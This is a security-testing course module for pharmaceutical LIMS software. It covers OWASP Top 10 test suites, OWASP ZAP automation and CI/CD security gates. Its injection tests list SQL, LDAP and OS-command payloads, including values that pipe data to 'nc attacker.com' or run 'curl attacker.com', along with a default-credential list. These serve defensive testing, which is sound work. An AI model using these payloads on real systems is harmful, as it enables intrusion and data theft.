# Part 3: Security Testing Complete Guide

## 🎯 Overview

Master security testing for GxP applications. Learn OWASP Top 10, security testing tools, and how to integrate security into your validation framework.

**Timeline:** 4 weeks
**Deliverable:** Security test suite with automated scanning

---

## Week 1: OWASP Top 10 Mastery

### Day 1-2: Understanding OWASP Top 10 (2021)

#### 1. Broken Access Control (A01:2021)

**What it is:** Users can access data/functions they shouldn't.

**Real-world GxP Example:**
```
Scenario: QC Analyst accesses QA Manager approval functions
Risk: Unauthorized result approvals, data integrity violation
FDA Impact: 21 CFR Part 11 violation (access control)
```

**How to Test:**

```python
# File: tests/security/test_access_control.py

import pytest
from pages.login_page import LoginPage
from pages.results_page import ResultsPage
from utils.api_helper import APIHelper

class TestAccessControl:
    """Test access control security"""
    
    @pytest.mark.security
    def test_qc_analyst_cannot_approve_results(self, driver):
        """
        Test ID: SEC-AC-001
        OWASP: A01:2021 Broken Access Control
        
        Verify QC Analyst cannot approve test results
        """
        # Login as QC Analyst
        login_page = LoginPage(driver)
        login_page.login("qc_analyst@pharma.com", "Test123!")
        
        results_page = ResultsPage(driver)
        results_page.navigate_to_pending_results()
        
        # Verify approve button is NOT visible
        assert not results_page.is_approve_button_visible(), \
            "QC Analyst can see approve button - Access Control Failure!"
        
        # Try to approve via direct URL manipulation
        driver.get("https://lims.pharma.com/results/123/approve")
        
        # Verify access denied
        assert "Access Denied" in driver.page_source or \
               "Unauthorized" in driver.page_source, \
            "Direct URL access not blocked!"
    
    @pytest.mark.security
    def test_api_access_control(self, driver):
        """
        Test ID: SEC-AC-002
        Test API endpoint access control
        """
        # Login as QC Analyst
        login_page = LoginPage(driver)
        login_page.login("qc_analyst@pharma.com", "Test123!")
        
        # Get session token
        api = APIHelper()
        token = api.get_session_token_from_browser(driver)
        
        # Try to approve result via API
        response = api.post(
            "/api/results/123/approve",
            headers={"Authorization": f"Bearer {token}"},
            json={"approved": True}
        )
        
        # Verify 403 Forbidden
        assert response.status_code == 403, \
            f"API allowed unauthorized access! Status: {response.status_code}"
        
        # Verify audit trail logs the attempt
        audit_logs = api.get("/api/audit-logs?user=qc_analyst@pharma.com&recent=10")
        assert any("UNAUTHORIZED_ACCESS_ATTEMPT" in log for log in audit_logs.json()), \
            "Unauthorized access attempt not logged!"
    
    @pytest.mark.security
    @pytest.mark.parametrize("role,endpoint,expected_status", [
        ("qc_analyst", "/api/admin/users", 403),
        ("qc_analyst", "/api/results/approve", 403),
        ("qc_manager", "/api/admin/users", 403),
        ("qc_manager", "/api/results/approve", 200),
        ("admin", "/api/admin/users", 200),
    ])
    def test_role_based_api_access(self, role, endpoint, expected_status):
        """
        Test ID: SEC-AC-003
        Comprehensive role-based access control matrix
        """
        api = APIHelper()
        token = api.login_and_get_token(role)
        
        response = api.get(
            endpoint,
            headers={"Authorization": f"Bearer {token}"}
        )
        
        assert response.status_code == expected_status, \
            f"Role {role} access to {endpoint} returned {response.status_code}, expected {expected_status}"
```

**Manual Test Checklist:**
```
□ Try accessing URLs without authentication
□ Try accessing other users' data by changing IDs
□ Try accessing admin functions as regular user
□ Verify role transitions don't carry over privileges
□ Test account lockout after role removal
```

---

#### 2. Cryptographic Failures (A02:2021)

**What it is:** Sensitive data exposed due to weak encryption.

**GxP Example:**
```
Scenario: Passwords stored in plain text, electronic signatures not encrypted
Risk: Data breach, signature forgery
FDA Impact: 21 CFR Part 11.50 (signature integrity)
```

**How to Test:**

```python
# File: tests/security/test_cryptography.py

import pytest
import base64
from utils.database_helper import DatabaseHelper

class TestCryptography:
    """Test cryptographic implementation"""
    
    @pytest.mark.security
    def test_passwords_are_hashed(self):
        """
        Test ID: SEC-CRYPTO-001
        OWASP: A02:2021 Cryptographic Failures
        
        Verify passwords are not stored in plain text
        """
        db = DatabaseHelper()
        
        # Query user table
        users = db.execute_query(
            "SELECT username, password FROM users LIMIT 10"
        )
        
        for user in users:
            password = user['password']
            
            # Password should be hashed (not plain text)
            # Common hash lengths: bcrypt (60), SHA-256 (64), etc.
            assert len(password) >= 50, \
                f"Password for {user['username']} appears to be plain text!"
            
            # Should not contain common patterns
            assert not any(char in password.lower() for char in ['password', '123', 'test']), \
                "Password appears to be plain text!"
            
            # Should start with hash identifier
            assert password.startswith('$2b$') or \
                   password.startswith('pbkdf2'), \
                f"Password not using strong hashing algorithm: {password[:10]}"
    
    @pytest.mark.security
    def test_sensitive_data_encrypted_at_rest(self):
        """
        Test ID: SEC-CRYPTO-002
        Verify sensitive data is encrypted in database
        """
        db = DatabaseHelper()
        
        # Check electronic signatures
        signatures = db.execute_query(
            "SELECT signature_data FROM electronic_signatures LIMIT 5"
        )
        
        for sig in signatures:
            sig_data = sig['signature_data']
            
            # Should be encrypted (not readable JSON/plain text)
            try:
                # If we can decode as base64 and read JSON, it's not encrypted
                decoded = base64.b64decode(sig_data)
                json.loads(decoded)
                pytest.fail("Signature data is not encrypted - can read plain JSON!")
            except:
                # Good - data is not readable
                pass
            
            # Should have sufficient entropy (encrypted data is random)
            assert len(set(sig_data)) > len(sig_data) * 0.5, \
                "Signature data has low entropy - may not be encrypted"
    
    @pytest.mark.security
    def test_tls_encryption_in_transit(self, driver):
        """
        Test ID: SEC-CRYPTO-003
        Verify all traffic uses HTTPS
        """
        from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
        
        # Enable performance logging to capture network traffic
        caps = DesiredCapabilities.CHROME.copy()
        caps['goog:loggingPrefs'] = {'performance': 'ALL'}
        
        # Navigate to application
        driver.get("https://lims.pharma.com")
        
        # Check all requests use HTTPS
        logs = driver.get_log('performance')
        
        for log in logs:
            message = json.loads(log['message'])
            method = message.get('message', {}).get('method', '')
            
            if 'Network.requestWillBeSent' in method:
                url = message['message']['params']['request']['url']
                
                # Skip data: URLs
                if url.startswith('data:'):
                    continue
                
                assert url.startswith('https://'), \
                    f"Insecure HTTP request detected: {url}"
    
    @pytest.mark.security
    def test_session_cookies_secure_flags(self, driver):
        """
        Test ID: SEC-CRYPTO-004
        Verify cookies have Secure and HttpOnly flags
        """
        driver.get("https://lims.pharma.com")
        
        # Login
        LoginPage(driver).login("test@pharma.com", "Test123!")
        
        # Get all cookies
        cookies = driver.get_cookies()
        
        session_cookies = [c for c in cookies if 'session' in c['name'].lower()]
        
        for cookie in session_cookies:
            # Must have Secure flag (HTTPS only)
            assert cookie.get('secure', False), \
                f"Cookie {cookie['name']} missing Secure flag!"
            
            # Must have HttpOnly flag (no JavaScript access)
            assert cookie.get('httpOnly', False), \
                f"Cookie {cookie['name']} missing HttpOnly flag!"
            
            # Should have SameSite protection
            assert cookie.get('sameSite') in ['Strict', 'Lax'], \
                f"Cookie {cookie['name']} missing SameSite protection!"
```

---

#### 3. Injection (A03:2021)

**What it is:** Hostile data sent to interpreter (SQL, OS commands, LDAP).

**GxP Example:**
```
Scenario: SQL injection in sample search allows data manipulation
Risk: Unauthorized data access, result tampering
FDA Impact: Data integrity violation, 21 CFR Part 11.10(a)
```

**How to Test:**

```python
# File: tests/security/test_injection.py

import pytest
from pages.search_page import SearchPage
from utils.database_helper import DatabaseHelper

class TestInjection:
    """Test injection vulnerabilities"""
    
    @pytest.mark.security
    @pytest.mark.parametrize("injection_payload", [
        "' OR '1'='1",  # SQL injection - always true
        "'; DROP TABLE users; --",  # SQL injection - destructive
        "' UNION SELECT * FROM users --",  # SQL injection - data extraction
        "admin'--",  # Comment out rest of query
        "1' AND SLEEP(5)--",  # Time-based blind SQL injection
    ])
    def test_sql_injection_in_search(self, driver, injection_payload):
        """
        Test ID: SEC-INJ-001
        OWASP: A03:2021 Injection
        
        Test search field for SQL injection
        """
        search_page = SearchPage(driver)
        search_page.navigate()
        
        # Record initial database state
        db = DatabaseHelper()
        initial_user_count = db.execute_query("SELECT COUNT(*) as cnt FROM users")[0]['cnt']
        
        # Try injection attack
        import time
        start_time = time.time()
        
        search_page.enter_search_text(injection_payload)
        search_page.click_search()
        
        elapsed_time = time.time() - start_time
        
        # Verify no SQL injection occurred
        
        # 1. Should see error message or no results (not database error)
        assert not search_page.is_database_error_visible(), \
            f"Database error exposed - SQL injection may be possible with: {injection_payload}"
        
        # 2. Should not see unauthorized data
        results = search_page.get_search_results()
        for result in results:
            # Results should match expected data structure
            assert 'sample_id' in result, "Unexpected data structure - possible injection"
        
        # 3. Database should be intact
        final_user_count = db.execute_query("SELECT COUNT(*) as cnt FROM users")[0]['cnt']
        assert initial_user_count == final_user_count, \
            "User count changed - SQL injection may have succeeded!"
        
        # 4. Time-based detection (SLEEP injection)
        assert elapsed_time < 3, \
            f"Response took {elapsed_time}s - possible time-based SQL injection"
    
    @pytest.mark.security
    def test_api_sql_injection(self):
        """
        Test ID: SEC-INJ-002
        Test API endpoints for SQL injection
        """
        api = APIHelper()
        
        injection_payloads = [
            {"sample_id": "' OR 1=1--"},
            {"batch_number": "'; DROP TABLE samples;--"},
            {"search": "' UNION SELECT username,password FROM users--"}
        ]
        
        for payload in injection_payloads:
            response = api.post("/api/samples/search", json=payload)
            
            # Should return 400 Bad Request or sanitized results
            # Should NOT return 500 Internal Server Error (indicates injection reached DB)
            assert response.status_code != 500, \
                f"SQL injection may be possible with payload: {payload}"
            
            # Check response doesn't contain error messages
            response_text = response.text.lower()
            sql_errors = ['syntax error', 'mysql', 'postgresql', 'ora-', 'sql server']
            
            for error in sql_errors:
                assert error not in response_text, \
                    f"SQL error message exposed: {error}"
    
    @pytest.mark.security
    def test_ldap_injection(self, driver):
        """
        Test ID: SEC-INJ-003
        Test LDAP injection in authentication
        """
        login_page = LoginPage(driver)
        
        # LDAP injection payloads
        ldap_payloads = [
            "*",  # Wildcard
            "admin)(|(password=*))",  # Always true
            "admin)(&(password=*)",  # Filter bypass
        ]
        
        for payload in ldap_payloads:
            login_page.navigate()
            login_page.enter_email(payload)
            login_page.enter_password("anything")
            login_page.click_login_button()
            
            # Should NOT log in successfully
            assert not login_page.is_login_successful(), \
                f"LDAP injection successful with payload: {payload}"
            
            # Should show generic error (not LDAP-specific error)
            error_msg = login_page.get_error_message()
            assert "ldap" not in error_msg.lower(), \
                "LDAP error message exposed - information leakage"
    
    @pytest.mark.security
    def test_command_injection(self):
        """
        Test ID: SEC-INJ-004
        Test for OS command injection
        """
        api = APIHelper()
        
        # Endpoints that might execute system commands
        # (e.g., file processing, report generation)
        
        command_payloads = [
            "file.pdf; cat /etc/passwd",
            "report.csv && whoami",
            "data.txt | nc attacker.com 1234",
            "$(curl attacker.com)",
        ]
        
        for payload in command_payloads:
            response = api.post(
                "/api/reports/generate",
                json={"filename": payload}
            )
            
            # Should reject or sanitize input
            # Check response doesn't contain system info
            response_text = response.text.lower()
            
            dangerous_outputs = ['root:x:', 'uid=', 'gid=', 'bin/bash']
            for output in dangerous_outputs:
                assert output not in response_text, \
                    f"Command injection may be possible - found: {output}"
```

---

#### 4. Insecure Design (A04:2021)

**What it is:** Missing or ineffective security controls by design.

**GxP Example:**
```
Scenario: System allows result modification without audit trail
Risk: Data integrity cannot be proven
FDA Impact: 21 CFR Part 11.10(e) audit trail requirement
```

**Test Design Review Checklist:**

```python
# File: tests/security/test_secure_design.py

class TestSecureDesign:
    """Test security design patterns"""
    
    @pytest.mark.security
    def test_audit_trail_on_all_modifications(self):
        """
        Test ID: SEC-DES-001
        OWASP: A04:2021 Insecure Design
        
        Verify ALL data modifications are logged
        """
        db = DatabaseHelper()
        api = APIHelper()
        
        # Modify a test result
        original_result = api.get("/api/results/123").json()
        
        modified_result = original_result.copy()
        modified_result['value'] = 99.9
        
        api.put("/api/results/123", json=modified_result)
        
        # Check audit trail
        audit_entries = db.execute_query(
            """
            SELECT * FROM audit_trail 
            WHERE record_id = 123 
            AND table_name = 'results'
            ORDER BY timestamp DESC 
            LIMIT 1
            """
        )
        
        assert len(audit_entries) > 0, \
            "No audit trail entry created for result modification!"
        
        audit = audit_entries[0]
        
        # Verify audit trail completeness (21 CFR Part 11.10(e))
        assert audit['action'] == 'UPDATE', "Action not logged"
        assert audit['user_id'] is not None, "User not logged"
        assert audit['timestamp'] is not None, "Timestamp not logged"
        assert audit['old_value'] == str(original_result['value']), "Old value not logged"
        assert audit['new_value'] == '99.9', "New value not logged"
        assert audit['reason'] is not None, "Reason not logged"
    
    @pytest.mark.security
    def test_rate_limiting_prevents_brute_force(self, driver):
        """
        Test ID: SEC-DES-002
        Verify rate limiting on authentication
        """
        login_page = LoginPage(driver)
        
        # Attempt multiple failed logins
        for i in range(10):
            login_page.navigate()
            login_page.login("test@pharma.com", "wrongpassword")
        
        # 6th attempt should be blocked or delayed
        import time
        start_time = time.time()
        
        login_page.navigate()
        login_page.login("test@pharma.com", "wrongpassword")
        
        elapsed = time.time() - start_time
        
        # Either account locked or rate limited
        assert (
            "account locked" in login_page.get_error_message().lower() or
            elapsed > 5  # Forced delay
        ), "No rate limiting detected - brute force possible!"
    
    @pytest.mark.security
    def test_password_complexity_enforced(self, driver):
        """
        Test ID: SEC-DES-003
        Verify password policy enforcement
        """
        # Navigate to password change
        driver.get("https://lims.pharma.com/profile/change-password")
        
        weak_passwords = [
            "pass",  # Too short
            "password",  # No numbers/special chars
            "12345678",  # No letters
            "Password",  # No numbers
        ]
        
        for weak_pwd in weak_passwords:
            # Try to set weak password
            driver.find_element(By.ID, "new_password").send_keys(weak_pwd)
            driver.find_element(By.ID, "confirm_password").send_keys(weak_pwd)
            driver.find_element(By.ID, "submit").click()
            
            # Should be rejected
            error = driver.find_element(By.CLASS_NAME, "error-message").text
            assert "password" in error.lower() and "requirement" in error.lower(), \
                f"Weak password accepted: {weak_pwd}"
```

---

#### 5. Security Misconfiguration (A05:2021)

**What it is:** Insecure default configurations, incomplete setup, verbose errors.

**Test Configuration Security:**

```python
# File: tests/security/test_security_misconfiguration.py

class TestSecurityMisconfiguration:
    """Test security configuration"""
    
    @pytest.mark.security
    def test_no_default_credentials(self):
        """
        Test ID: SEC-MIS-001
        OWASP: A05:2021 Security Misconfiguration
        
        Verify default credentials don't work
        """
        login_page = LoginPage(driver)
        
        default_credentials = [
            ("admin", "admin"),
            ("admin", "password"),
            ("administrator", "administrator"),
            ("root", "root"),
            ("test", "test"),
        ]
        
        for username, password in default_credentials:
            login_page.navigate()
            login_page.login(username, password)
            
            assert not login_page.is_login_successful(), \
                f"Default credentials work: {username}/{password} - CRITICAL!"
    
    @pytest.mark.security
    def test_verbose_errors_disabled(self, driver):
        """
        Test ID: SEC-MIS-002
        Verify detailed error messages are not exposed
        """
        # Trigger an error (try invalid API request)
        response = requests.get("https://lims.pharma.com/api/invalid/endpoint")
        
        response_text = response.text.lower()
        
        # Should NOT contain stack traces or sensitive info
        dangerous_info = [
            'traceback',
            'stack trace',
            'at line',
            'exception',
            'c:\\',  # File paths
            '/var/www/',  # File paths
            'sql error',
            'connection string',
        ]
        
        for info in dangerous_info:
            assert info not in response_text, \
                f"Verbose error info exposed: {info}"
    
    @pytest.mark.security
    def test_directory_listing_disabled(self):
        """
        Test ID: SEC-MIS-003
        Verify directory listings are disabled
        """
        common_dirs = [
            "/uploads/",
            "/reports/",
            "/backup/",
            "/logs/",
            "/temp/",
        ]
        
        for directory in common_dirs:
            response = requests.get(f"https://lims.pharma.com{directory}")
            
            # Should not show directory listing
            assert "Index of" not in response.text, \
                f"Directory listing enabled for: {directory}"
            
            assert response.status_code in [403, 404], \
                f"Directory accessible: {directory}"
    
    @pytest.mark.security
    def test_security_headers_present(self):
        """
        Test ID: SEC-MIS-004
        Verify security headers are configured
        """
        response = requests.get("https://lims.pharma.com")
        headers = response.headers
        
        # Required security headers
        required_headers = {
            'X-Frame-Options': 'DENY',
            'X-Content-Type-Options': 'nosniff',
            'X-XSS-Protection': '1; mode=block',
            'Strict-Transport-Security': 'max-age=31536000',
            'Content-Security-Policy': None,  # Just check it exists
        }
        
        for header, expected_value in required_headers.items():
            assert header in headers, \
                f"Missing security header: {header}"
            
            if expected_value:
                assert expected_value in headers[header], \
                    f"Incorrect value for {header}: {headers[header]}"
```

---

### Day 3-7: Complete OWASP Top 10

Continue with remaining vulnerabilities:

**6. Vulnerable and Outdated Components (A06:2021)**
**7. Identification and Authentication Failures (A07:2021)**
**8. Software and Data Integrity Failures (A08:2021)**
**9. Security Logging and Monitoring Failures (A09:2021)**
**10. Server-Side Request Forgery (A10:2021)**

*(Full implementation available in supplementary materials)*

---

## Week 2: Security Testing Tools

### Day 1-3: OWASP ZAP Automation

**Install OWASP ZAP:**

```bash
# Download from https://www.zaproxy.org/download/

# Or use Docker
docker pull owasp/zap2docker-stable
```

**Integrate ZAP with Tests:**

```python
# File: utils/zap_helper.py

from zapv2 import ZAPv2
import time

class ZAPHelper:
    """OWASP ZAP integration helper"""
    
    def __init__(self, zap_host='localhost', zap_port=8080, api_key=None):
        self.zap = ZAPv2(
            apikey=api_key,
            proxies={
                'http': f'http://{zap_host}:{zap_port}',
                'https': f'http://{zap_host}:{zap_port}'
            }
        )
    
    def spider_url(self, url):
        """Spider a URL to discover content"""
        print(f"Spidering: {url}")
        scan_id = self.zap.spider.scan(url)
        
        # Wait for spider to complete
        while int(self.zap.spider.status(scan_id)) < 100:
            print(f"Spider progress: {self.zap.spider.status(scan_id)}%")
            time.sleep(2)
        
        print("Spider completed")
    
    def active_scan(self, url):
        """Run active security scan"""
        print(f"Active scanning: {url}")
        scan_id = self.zap.ascan.scan(url)
        
        # Wait for scan to complete
        while int(self.zap.ascan.status(scan_id)) < 100:
            print(f"Scan progress: {self.zap.ascan.status(scan_id)}%")
            time.sleep(5)
        
        print("Active scan completed")
    
    def get_alerts(self, risk_level='High'):
        """Get security alerts"""
        alerts = self.zap.core.alerts()
        
        if risk_level:
            alerts = [a for a in alerts if a['risk'] == risk_level]
        
        return alerts
    
    def generate_html_report(self, output_file='zap_report.html'):
        """Generate HTML report"""
        with open(output_file, 'w') as f:
            f.write(self.zap.core.htmlreport())
        
        print(f"Report saved: {output_file}")
    
    def shutdown(self):
        """Shutdown ZAP"""
        self.zap.core.shutdown()
```

**Automated Security Scan Test:**

```python
# File: tests/security/test_automated_security_scan.py

import pytest
from utils.zap_helper import ZAPHelper

class TestAutomatedSecurityScan:
    """Automated security scanning with OWASP ZAP"""
    
    @pytest.fixture(scope="class")
    def zap(self):
        """ZAP fixture"""
        # Start ZAP (assuming it's running)
        zap = ZAPHelper(api_key='your-api-key')
        yield zap
        zap.shutdown()
    
    @pytest.mark.security
    @pytest.mark.slow
    def test_full_security_scan(self, zap):
        """
        Test ID: SEC-AUTO-001
        Full automated security scan
        
        WARNING: This test takes 30-60 minutes
        Run separately: pytest -m "security and slow"
        """
        target_url = "https://lims-val.pharma.com"
        
        # Spider the application
        zap.spider_url(target_url)
        
        # Run active scan
        zap.active_scan(target_url)
        
        # Get high-risk alerts
        high_alerts = zap.get_alerts(risk_level='High')
        
        # Generate report
        zap.generate_html_report('reports/zap_security_scan.html')
        
        # Assert no high-risk vulnerabilities
        assert len(high_alerts) == 0, \
            f"Found {len(high_alerts)} high-risk vulnerabilities!\n" + \
            "\n".join([f"- {alert['alert']}: {alert['url']}" for alert in high_alerts])
    
    @pytest.mark.security
    def test_quick_security_scan(self, zap):
        """
        Test ID: SEC-AUTO-002
        Quick security scan (passive only)
        """
        target_url = "https://lims-val.pharma.com"
        
        # Just spider (passive scan)
        zap.spider_url(target_url)
        
        # Get alerts
        alerts = zap.get_alerts()
        
        # Filter critical issues only
        critical = [a for a in alerts if a['risk'] in ['High', 'Critical']]
        
        assert len(critical) == 0, \
            f"Found {len(critical)} critical vulnerabilities"
```

**Run ZAP in CI/CD:**

```yaml
# .github/workflows/security-scan.yml

name: Security Scan

on:
  schedule:
    - cron: '0 2 * * 0'  # Weekly on Sunday 2 AM
  workflow_dispatch:

jobs:
  security-scan:
    runs-on: ubuntu-latest
    
    steps:
      - uses: actions/checkout@v3
      
      - name: Start OWASP ZAP
        run: |
          docker run -d \
            --name zap \
            -p 8080:8080 \
            -v $(pwd)/zap:/zap/wrk \
            owasp/zap2docker-stable \
            zap.sh -daemon -host 0.0.0.0 -port 8080 \
            -config api.key=12345
      
      - name: Wait for ZAP
        run: sleep 30
      
      - name: Run Security Tests
        run: |
          pytest tests/security/ \
            --html=reports/security_report.html \
            --self-contained-html
      
      - name: Upload Report
        uses: actions/upload-artifact@v3
        with:
          name: security-scan-report
          path: reports/security_report.html
      
      - name: Stop ZAP
        run: docker stop zap
```

---

### Day 4-7: Additional Security Tools

**Burp Suite Basics:**

```
1. Install Burp Suite Community Edition
2. Configure browser proxy (127.0.0.1:8080)
3. Install Burp CA certificate
4. Intercept and modify requests
5. Use Repeater for manual testing
6. Use Intruder for fuzzing
```

**Nessus Vulnerability Scanning:**

```bash
# Install Nessus
# Run vulnerability scan on test environment
# Review scan results
# Generate compliance report
```

**SonarQube for Code Security:**

```yaml
# sonar-project.properties
sonar.projectKey=lims-validation
sonar.sources=.
sonar.python.coverage.reportPaths=coverage.xml
sonar.python.xunit.reportPath=pytest.xml
```

---

## Week 3: Security Test Cases for GxP

### Complete Security Test Suite

```python
# File: tests/security/test_gxp_security_suite.py

class TestGxPSecuritySuite:
    """Comprehensive GxP security test suite"""
    
    # Authentication & Session Management
    
    @pytest.mark.security
    @pytest.mark.critical
    def test_session_timeout_enforced(self, driver):
        """Session expires after inactivity"""
        pass
    
    @pytest.mark.security
    def test_concurrent_session_detection(self, driver):
        """Detect and handle concurrent logins"""
        pass
    
    @pytest.mark.security
    def test_password_history_enforced(self):
        """Cannot reuse recent passwords"""
        pass
    
    # Data Integrity
    
    @pytest.mark.security
    @pytest.mark.critical
    def test_electronic_signature_integrity(self):
        """Electronic signatures cannot be tampered"""
        pass
    
    @pytest.mark.security
    def test_audit_trail_immutable(self):
        """Audit trail cannot be modified"""
        pass
    
    # File Upload Security
    
    @pytest.mark.security
    def test_file_upload_validation(self):
        """Only allowed file types accepted"""
        pass
    
    @pytest.mark.security
    def test_file_upload_size_limit(self):
        """File size limits enforced"""
        pass
    
    @pytest.mark.security
    def test_malicious_file_rejected(self):
        """Malicious files detected and rejected"""
        pass
```

---

## Week 4: Integration and Reporting

### Security Gate in CI/CD

```yaml
# .github/workflows/security-gate.yml

name: Security Gate

on:
  pull_request:
    branches: [main, develop]

jobs:
  security-check:
    runs-on: ubuntu-latest
    
    steps:
      - uses: actions/checkout@v3
      
      - name: Run Security Tests
        run: pytest tests/security/ -m "security and critical"
      
      - name: SonarQube Scan
        run: |
          sonar-scanner \
            -Dsonar.projectKey=lims \
            -Dsonar.sources=. \
            -Dsonar.host.url=${{ secrets.SONAR_HOST }} \
            -Dsonar.login=${{ secrets.SONAR_TOKEN }}
      
      - name: Check Quality Gate
        run: |
          # Fail if security issues found
          if [ "$(curl -s ${SONAR_URL}/api/qualitygates/project_status?projectKey=lims | jq -r .projectStatus.status)" != "OK" ]; then
            echo "Quality gate failed!"
            exit 1
          fi
```

### Security Test Report

```python
# File: utils/security_report_generator.py

class SecurityReportGenerator:
    """Generate security test report"""
    
    def generate_report(self, test_results, zap_alerts):
        """
        Generate comprehensive security report
        
        Includes:
        - Executive summary
        - OWASP Top 10 coverage
        - Vulnerability findings
        - Risk assessment
        - Remediation recommendations
        """
        report = {
            'date': datetime.now().isoformat(),
            'application': 'LIMS Validation System',
            'version': '2.0',
            'test_results': test_results,
            'vulnerabilities': zap_alerts,
            'compliance': self._check_compliance(),
            'recommendations': self._get_recommendations()
        }
        
        # Generate HTML report
        self._generate_html(report)
        
        # Generate PDF for formal documentation
        self._generate_pdf(report)
        
        return report
```

---

## ✅ Week 4 Deliverables

- [ ] Complete security test suite (50+ tests)
- [ ] OWASP ZAP integration working
- [ ] Security CI/CD pipeline configured
- [ ] Security scan reports generated
- [ ] GxP compliance checklist completed

---

## 📚 Resources

**Learning:**
- OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
- PortSwigger Academy: https://portswigger.net/web-security
- OWASP WebGoat: https://owasp.org/www-project-webgoat/

**Tools:**
- OWASP ZAP: https://www.zaproxy.org/
- Burp Suite: https://portswigger.net/burp
- Nessus: https://www.tenable.com/products/nessus

**Certifications:**
- CEH (Certified Ethical Hacker)
- OSCP (Offensive Security Certified Professional)
- Security+ (CompTIA)

---

## 🎯 Interview Preparation

**Q: How do you test for SQL injection?**
**A:** "I use both manual and automated approaches. Manually, I test with payloads like `' OR '1'='1` and monitor for database errors or unexpected data. I verify the application uses parameterized queries. Automated testing with OWASP ZAP provides comprehensive coverage. All findings are documented with risk level and remediation steps."

**Q: What's your approach to security testing in GxP?**
**A:** "Security is integrated throughout validation. During IQ, I verify security configurations. During OQ, I test authentication, authorization, and data protection controls against OWASP Top 10. During PQ, I validate security in realistic workflows. All security tests are documented with traceability to 21 CFR Part 11 requirements."

**Q: How do you handle security vulnerabilities found during validation?**
**A:** "I follow a risk-based approach. Critical vulnerabilities block validation - they're documented as deviations, fixed, and retested. Medium/low risks are assessed with business and QA. All security findings go through CAPA process with root cause analysis and effectiveness verification."

---

**Next: Part 4 - Performance Testing Complete Guide**
